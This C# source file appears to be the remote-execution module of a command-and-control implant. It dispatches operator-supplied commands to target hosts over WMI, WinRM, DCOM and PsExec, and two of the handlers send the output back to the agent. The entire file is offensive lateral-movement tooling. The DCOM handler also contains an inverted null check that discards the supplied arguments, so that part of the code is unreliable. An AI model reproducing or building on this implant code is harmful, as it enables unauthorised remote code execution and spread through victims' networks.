using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Microsoft.PowerShell;
using Shared.Models;

using System;
using System.Collections.Generic;

namespace Agent.Modules
{
    public class RemoteExecModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "RemoteExec",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "WMI",
                        Delegate = WMIExec
                    },
                    new ModuleInfo.Command
                    {
                        Name = "WinRM",
                        Delegate = WinRMExec
                    },
                    new ModuleInfo.Command
                    {
                        Name = "DCOM",
                        Delegate = DCOMExec
                    },
                    new ModuleInfo.Command
                    {
                        Name = "PsExec",
                        Delegate = PsExec
                    }
                }
            };
        }

        void WMIExec(string AgentID, AgentTask Task)
        {
            try
            {
                var target = (string)Task.Parameters["Target"];
                var command = (string)Task.Parameters["Command"];
                
                using (var wmiExec = new WMIExec(target))
                {
                    var result = wmiExec.Execute(command);
                    Agent.SendMessage(result);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void WinRMExec(string AgentID, AgentTask Task)
        {
            try
            {
                var target = (string)Task.Parameters["Target"];
                var command = (string)Task.Parameters["Command"];

                var winrm = new WinRMExec(target);
                var result = winrm.Execute(command);

                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void DCOMExec(string AgentID, AgentTask Task)
        {
            try
            {
                var target = (string)Task.Parameters["Target"];
                var command = (string)Task.Parameters["Command"];
                var arguments = Task.Parameters["Arguments"];

                var args = arguments == null ? (string)arguments : string.Empty;

                var dcom = new DCOMExec(target);
                dcom.Execute(command, args);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void PsExec(string AgentID, AgentTask Task)
        {
            try
            {
                var target = (string)Task.Parameters["Target"];
                var command = (string)Task.Parameters["Command"];

                using (var psexec = new PsExec(target))
                {
                    psexec.Execute(command);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}